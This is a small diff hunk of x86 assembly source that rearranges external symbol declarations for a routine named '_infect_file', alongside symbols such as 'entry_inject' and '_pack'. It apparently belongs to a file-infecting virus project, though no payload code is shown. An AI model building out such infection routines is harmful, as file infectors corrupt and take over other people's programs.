@@ -2,12 +2,18 @@
 %include "data.inc"
 
 section .text
-
-extern _ft_memcmp
-extern _ft_memcpy
-extern _pack
-
-global _infect_file
+    extern _pack
+    extern _ft_strlen
+    extern _ft_memmem
+    extern _params
+    extern _eof
+    extern entry_inject
+    extern _start
+    extern _pack_start
+    extern length
+    extern _ft_memcpy
+    extern _ft_memcmp
+	global _infect_file
 
 _infect_file: ; (string rdi, stat rsi)
 	push r10
